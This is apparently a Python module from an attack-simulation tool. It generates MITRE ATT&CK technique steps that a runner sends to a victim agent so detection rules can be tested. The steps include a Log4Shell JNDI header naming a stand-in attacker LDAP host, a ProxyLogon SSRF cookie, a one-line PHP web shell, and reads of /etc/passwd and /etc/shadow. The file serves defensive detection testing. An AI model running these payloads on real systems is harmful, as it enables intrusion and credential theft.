"""Built-in technique simulations.

Each technique returns a list of step dicts that the runner POSTs to the
victim agent's /simulate endpoint. Steps produce the behavioral fingerprint
that detection rules look for: process launches, file writes, network calls.
"""
from __future__ import annotations

from typing import Any

Step = dict[str, Any]


def t1190_exploit_public_facing(variant: str = "log4shell") -> list[Step]:
    """T1190 — Exploit Public-Facing Application."""
    if variant == "log4shell":
        return [
            {
                "technique": "T1190",
                "key": "network_connect",
                "exe": "/usr/bin/curl",
                "uid": "33",
                "event_type": "SYSCALL",
                "syscall_name": "connect",
                "command": "curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://attacker/exploit}' http://localhost/ 2>&1 || true",
                "extra": {"exploit_pattern": "jndi_injection", "cve": "CVE-2021-44228"},
                "description": "Simulate Log4Shell JNDI injection HTTP request",
            }
        ]
    elif variant == "proxylogon":
        return [
            {
                "technique": "T1190",
                "key": "network_connect",
                "exe": "/usr/bin/curl",
                "uid": "33",
                "event_type": "SYSCALL",
                "syscall_name": "connect",
                "command": "curl -s -o /dev/null --cookie 'X-BEResource=localhost/EWS/Exchange.asmx?a=~3;' http://localhost/ 2>&1 || true",
                "extra": {"exploit_pattern": "ssrf_proxylogon", "cve": "CVE-2021-26855"},
                "description": "Simulate ProxyLogon SSRF cookie pattern",
            }
        ]
    return []


def t1059_004_unix_shell() -> list[Step]:
    """T1059.004 — Command and Scripting Interpreter: Unix Shell."""
    return [
        {
            "technique": "T1059.004",
            "key": "shell_exec",
            "exe": "/bin/bash",
            "uid": "33",
            "event_type": "SYSCALL",
            "syscall_name": "execve",
            "command": "bash -c 'id && whoami && hostname && cat /proc/version'",
            "extra": {"parent_comm": "java", "proctitle": "/bin/bash -c id"},
            "description": "Shell spawned from web process context (uid 33 = www-data)",
        },
        {
            "technique": "T1059.004",
            "key": "interpreter_exec",
            "exe": "/usr/bin/python3",
            "uid": "33",
            "event_type": "SYSCALL",
            "syscall_name": "execve",
            "command": "python3 -c 'import os; print(os.getcwd()); import socket; print(socket.gethostname())'",
            "extra": {"parent_comm": "java"},
            "description": "Python interpreter launched post-exploitation",
        },
    ]


def t1068_privilege_escalation() -> list[Step]:
    """T1068 — Exploitation for Privilege Escalation."""
    return [
        {
            "technique": "T1068",
            "key": "priv_change",
            "exe": "/tmp/spoolsv_exploit",
            "uid": "1001",
            "event_type": "SYSCALL",
            "syscall_name": "setuid",
            "command": "python3 -c \"import ctypes, os; lib=ctypes.CDLL(None); print('setuid(0) attempt, current uid:', os.getuid())\"",
            "extra": {"cve": "CVE-2021-34527", "exploit": "PrintNightmare"},
            "description": "Privilege escalation attempt via setuid (PrintNightmare pattern)",
        },
        {
            "technique": "T1068",
            "key": "priv_change",
            "exe": "/usr/bin/sudo",
            "uid": "1001",
            "event_type": "SYSCALL",
            "syscall_name": "execve",
            "command": "sudo -n id 2>&1 || echo 'sudo attempt failed (expected in lab)'",
            "extra": {"cve": "CVE-2021-34527"},
            "description": "Sudo escalation attempt",
        },
    ]


def t1547_012_print_processor() -> list[Step]:
    """T1547.012 — Boot/Logon Autostart: Print Processors."""
    return [
        {
            "technique": "T1547.012",
            "key": "file_write",
            "exe": "/bin/cp",
            "uid": "1001",
            "event_type": "SYSCALL",
            "syscall_name": "execve",
            "command": "cp /bin/ls /tmp/evil_print_processor && chmod +x /tmp/evil_print_processor && echo 'Malicious print processor planted at /tmp/evil_print_processor'",
            "extra": {"cve": "CVE-2021-34527", "persistence": "print_processor"},
            "description": "Drop malicious print processor binary (PrintNightmare persistence)",
        }
    ]


def t1574_001_dll_hijack() -> list[Step]:
    """T1574.001 — Hijack Execution Flow: DLL Search Order Hijacking."""
    return [
        {
            "technique": "T1574.001",
            "key": "file_write",
            "exe": "/bin/bash",
            "uid": "1001",
            "event_type": "SYSCALL",
            "syscall_name": "execve",
            "command": "mkdir -p /tmp/hijack && echo '#!/bin/bash\nid' > /tmp/hijack/libspoolss.so && chmod +x /tmp/hijack/libspoolss.so && ls -la /tmp/hijack/",
            "extra": {"cve": "CVE-2021-34527"},
            "description": "Plant hijack library in writable directory",
        }
    ]


def t1505_003_webshell() -> list[Step]:
    """T1505.003 — Server Software Component: Web Shell."""
    return [
        {
            "technique": "T1505.003",
            "key": "file_write",
            "exe": "/bin/bash",
            "uid": "33",
            "event_type": "SYSCALL",
            "syscall_name": "execve",
            "command": "mkdir -p /tmp/aspnet_client && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/aspnet_client/shell.php && echo 'Webshell written to /tmp/aspnet_client/shell.php'",
            "extra": {"cve": "CVE-2021-26855", "webshell_path": "/aspnet_client/shell.php"},
            "description": "Write PHP webshell (ProxyLogon post-exploitation)",
        }
    ]


def t1078_valid_accounts() -> list[Step]:
    """T1078 — Valid Accounts."""
    return [
        {
            "technique": "T1078",
            "key": "sensitive_file",
            "exe": "/bin/cat",
            "uid": "33",
            "event_type": "PATH",
            "syscall_name": "openat",
            "command": "cat /etc/passwd | grep -v nologin | grep -v false && id && groups",
            "extra": {"cve": "CVE-2021-26855", "nametype": "READ", "name": "/etc/passwd"},
            "description": "Enumerate valid accounts post-exploitation",
        }
    ]


def t1552_credential_files() -> list[Step]:
    """T1552.001 — Unsecured Credentials: Credentials In Files."""
    return [
        {
            "technique": "T1552.001",
            "key": "sensitive_file",
            "exe": "/bin/cat",
            "uid": "0",
            "event_type": "PATH",
            "syscall_name": "openat",
            "command": "ls -la /etc/shadow /etc/passwd /etc/ssh/ 2>&1 && echo 'Credential file access attempted'",
            "extra": {"name": "/etc/shadow", "nametype": "READ"},
            "description": "Attempt to read credential files",
        }
    ]


# ── Technique registry ─────────────────────────────────────────────────────

_REGISTRY: dict[str, Any] = {
    "T1190:log4shell":    lambda: t1190_exploit_public_facing("log4shell"),
    "T1190:proxylogon":   lambda: t1190_exploit_public_facing("proxylogon"),
    "T1190":              lambda: t1190_exploit_public_facing("log4shell"),
    "T1059.004":          t1059_004_unix_shell,
    "T1068":              t1068_privilege_escalation,
    "T1547.012":          t1547_012_print_processor,
    "T1574.001":          t1574_001_dll_hijack,
    "T1505.003":          t1505_003_webshell,
    "T1078":              t1078_valid_accounts,
    "T1552.001":          t1552_credential_files,
}


def get_steps(technique_id: str, variant: str = "") -> list[Step]:
    key = f"{technique_id}:{variant}" if variant and f"{technique_id}:{variant}" in _REGISTRY else technique_id
    fn = _REGISTRY.get(key)
    if fn is None:
        return []
    return fn()
